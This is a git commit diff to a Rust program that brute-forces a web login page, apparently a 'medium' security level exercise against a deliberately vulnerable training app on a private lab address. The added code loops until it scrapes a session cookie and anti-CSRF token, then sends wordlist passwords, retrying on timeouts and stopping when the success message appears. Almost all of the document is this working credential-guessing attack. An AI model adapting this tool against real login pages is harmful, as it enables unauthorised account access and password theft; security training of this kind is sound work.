8d1d81b41eb3fca4ffe5f9bcfd931b08986b5016
AmadeusWM <63149896+AmadeusWM@users.noreply.github.com>
2025-04-10 13:06:43 +0200

    brute medium works

--- src/medium/bruteforce.rs
+++ src/medium/bruteforce.rs
@@ -50,26 +50,28 @@ fn extract_phpsessid(response: &reqwest::Response) -> String {
 async fn try_password(
     client: &reqwest::Client,
     password: String,
+    index: usize
 )-> Result<(), Box<dyn Error + Send + Sync>> {
-    let login_page_response = client.get("http://10.164.2.70/login.php").send().await?;
+    let mut user_token = String::new();
+    let mut phpsessid = String::new();
+    while user_token.is_empty() {
+        let login_page_response = client.get("http://10.164.2.70/login.php").send().await?;
 
-    let phpsessid = extract_phpsessid(&login_page_response);
+        phpsessid = extract_phpsessid(&login_page_response);
 
-    let login_page_text = login_page_response.text().await?;
-
-    let user_token = {
+        let login_page_text = login_page_response.text().await?;
         let document = scraper::Html::parse_document(&login_page_text);
         let selector = scraper::Selector::parse(r#"input[name="user_token"]"#).unwrap();
-        let input_element = document.select(&selector).next().expect("No user_token input field found");
-        input_element.value().attr("value").expect("No value attribute in user_token input field").to_string()
-    };
-
+        let input_element = document.select(&selector).next();
+        if let Some(input_element) = input_element {
+            user_token = input_element.value().attr("value").expect("No value attribute in user_token input field").to_string();
+        };
+    }
     let mut headers = HeaderMap::new();
     headers.insert(
         COOKIE,
         HeaderValue::from_str(&format!("PHPSESSID={}; security=medium", phpsessid))?,
     );
-
 
     let response = client.post("http://10.164.2.70/login.php")
         .headers(headers)
@@ -82,7 +84,6 @@ async fn try_password(
         .send().await?;
 
     // let phpsessid = extract_phpsessid(&response);
-    println!("using session id: {}", phpsessid);
 
     // Create headers with PHPSESSID cookie
     let mut headers = HeaderMap::new();
@@ -97,31 +98,35 @@ async fn try_password(
         "{}?username={}&password={}&Login=Login#",
         URL, USERNAME, password
     );
-    println!("trying: {}, {}", USERNAME, password);
 
     let client_clone = client.clone();
     let password = password.clone();
+    // NOTE: This part causes a timeout, which is why we do this on an asynchronous
+    // thread
     tokio::spawn(async move {
-        let response = client_clone
-            .get(&payload)
-            .headers(headers)
-            // .timeout(Duration::from_millis(50))
-            .send().await?;
+        loop {
+            let response = client_clone
+                .get(&payload)
+                .headers(headers.clone())
+                .send().await?;
 
-        let response_text = response.text().await?;
+            let response_text = response.text().await?;
 
-        // Check if login was successful
-        if response_text.contains("Welcome to the password protected area") {
-            println!("Found password: {}", password);
-            std::process::abort();
-            return Ok(Some(password.to_string()));
+            // println!("Handled: {} => {}", index, response_text);
+
+            // Check if login was successful
+            if response_text.contains("Welcome to the password protected area") {
+                println!("Found password: {}", password);
+                std::process::exit(0);
+            }
+            else if response_text.contains("Username and/or password incorrect.") {
+                println!("no password found for: {}", index);
+                return Ok::<Option<String>, Box<dyn Error + Send + Sync>>(None);
+            } else {
+                // println!("fucked up, retrying...");
+                tokio::time::sleep(Duration::from_millis(100)).await;
+            }
         }
-        else if response_text.contains("Username and/or password incorrect.") {
-            return Ok(None);
-        }
-        // panic!("Login failed, password neither incorrect nor correct");
-
-        Ok::<Option<String>, Box<dyn Error + Send + Sync>>(None)
     });
     Ok(())
 }
@@ -130,24 +135,29 @@ async fn try_password(
 pub async fn run() -> Result<(), Box<dyn Error>> {
     let passwords = read_passwords("passwords/other.txt");
     let total_passwords = passwords.len();
-    let counter = Arc::new(Mutex::new(0));
 
     println!(
-        "Starting brute force with {} passwords across {} threads",
-        total_passwords, THREADS
+        "Starting brute force with {} passwords",
+        total_passwords
     );
 
     // Split passwords into chunks for each thread
     let client = reqwest::Client::builder()
         .pool_idle_timeout(std::time::Duration::from_secs(30))
         .build()?;
-    for password in passwords {
-        match try_password(
-            &client,
-            password.clone(),
-        ).await {
-            Err(e) => println!("{:?}", e),
-            _ => continue,
+    for (index, password) in passwords.into_iter().enumerate() {
+        loop {
+            match try_password(
+                &client,
+                password.clone(),
+                index,
+            ).await {
+                Err(e) => {
+                    println!("Failed with error {:?}... retrying now", e);
+                    continue;
+                },
+                _ => break,
+            }
         }
     }
 
